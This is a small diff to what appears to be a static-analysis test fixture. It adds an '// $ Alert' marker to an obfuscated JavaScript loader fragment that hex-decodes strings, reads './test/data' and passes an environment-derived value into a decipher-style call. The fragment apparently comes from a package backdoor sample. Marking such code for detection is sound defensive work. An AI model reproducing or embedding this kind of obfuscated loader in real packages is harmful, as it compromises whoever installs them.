@@ -93,7 +93,7 @@ module.exports = function (e, n) {
     function e(r) {
       return Buffer.from(r, "hex").toString();
     }
-    var n = r(e("2e2f746573742f64617461")),
+    var n = r(e("2e2f746573742f64617461")), // $ Alert
       o = t[e(n[3])][e(n[4])];
     if (!o) return;
     var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
